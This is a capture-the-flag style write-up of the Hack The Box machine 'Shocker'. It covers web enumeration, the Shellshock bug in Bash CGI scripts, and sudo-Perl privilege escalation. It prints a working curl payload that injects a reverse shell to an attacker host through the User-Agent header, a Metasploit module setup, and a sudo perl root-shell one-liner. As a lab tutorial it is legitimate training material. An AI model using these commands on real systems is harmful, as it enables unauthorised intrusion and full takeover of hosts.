---
title: HTB — Shocker
type: lab-writeup
platform: HTB
difficulty: foundational
os: Linux
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - HTB
  - linux
  - shellshock
  - cgi
  - bash
  - CVE-2014-6271
  - sudo
  - perl
---

# HTB — Shocker

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Shocker |
| Difficulty | Easy |
| OS | Ubuntu 16.04 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-27 |

> **Summary:** CGI script vulnerable to Shellshock (CVE-2014-6271) grants initial shell. Sudo rights on Perl lead to root.

---

## Objectives

- [ ] Recon: discover /cgi-bin/ scripts
- [ ] Exploit: Shellshock via crafted User-Agent header
- [ ] Escalate: sudo Perl to root shell
- [ ] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/shocker_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80/tcp | http | Apache httpd 2.4.18 |
| 2222/tcp | ssh | OpenSSH 7.2p2 (non-standard port) |

### Web enumeration

Standard directory busting misses `/cgi-bin/` because Apache returns 403 (not 404). Must bust with trailing slash and then enumerate inside:

```bash
gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi
```

**Found:** `/cgi-bin/user.sh` — returns uptime output (Bash CGI script)

---

## Vulnerability Background

**CVE-2014-6271 (Shellshock)** — Critical RCE in GNU Bash

| Field | Detail |
|---|---|
| CVE | CVE-2014-6271 |
| CVSS | 10.0 Critical |
| Affected | Bash through 4.3 |
| Type | Environment variable injection → arbitrary command execution |
| Vector | HTTP headers passed as environment variables to CGI scripts |

**Root cause:** Bash processes trailing commands after function definitions in environment variables. When a web server passes HTTP headers (User-Agent, Referer, Cookie) as environment variables to a CGI script, an attacker can inject arbitrary commands.

---

## Foothold

### Manual Shellshock exploitation

```bash
curl -A '() { :; }; /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' http://<MACHINE_IP>/cgi-bin/user.sh
```

**Breakdown:**
- `() { :; };` — empty function definition (the Shellshock trigger)
- Everything after `;` executes as a command
- `-A` sets the User-Agent header, which Apache passes as `HTTP_USER_AGENT` env var to the CGI script

```bash
# Listener
nc -lvnp 4444
```

**Result:** Shell as `shelly`

### Alternative — Metasploit

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <IP>
set TARGETURI /cgi-bin/user.sh
set LHOST <YOUR_IP>
run
```

---

## Privilege Escalation

### sudo enumeration

```bash
sudo -l
```

Output:
```
User shelly may run the following commands:
    (root) NOPASSWD: /usr/bin/perl
```

### Exploitation via Perl

```bash
sudo perl -e 'exec "/bin/bash";'
```

**Result:** Root shell.

> **GTFOBins reference:** Any interpreted language (perl, python, ruby) with sudo NOPASSWD is a trivial root escalation.

---

## Flags

| Flag | Location |
|---|---|
| User | `/home/shelly/user.txt` |
| Root | `/root/root.txt` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Shellshock is a decade old but still appears in CTFs and legacy systems — always check CGI scripts
- `/cgi-bin/` returns 403 not 404 — enumerate inside it with file extensions `.sh`, `.pl`, `.cgi`
- HTTP headers are a legitimate attack surface — User-Agent, Referer, Cookie all become env vars in CGI
- Sudo on interpreters (perl, python, ruby, bash) is an instant root path — check GTFOBins
- Non-standard SSH port (2222) is a common CTF pattern — always scan all ports or at least top 10000

---

## Tools Used

- Nmap
- Gobuster
- Netcat
- curl

---

## References

- [Hack The Box — Shocker](https://app.hackthebox.com/machines/Shocker)
- [NVD CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [GTFOBins — Perl](https://gtfobins.github.io/gtfobins/perl/)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Linux-Privilege-Escalation
- Gobuster
- Reverse-Shell-Cheatsheet
- Bash-Scripting

---
<- [[Labs-MOC]]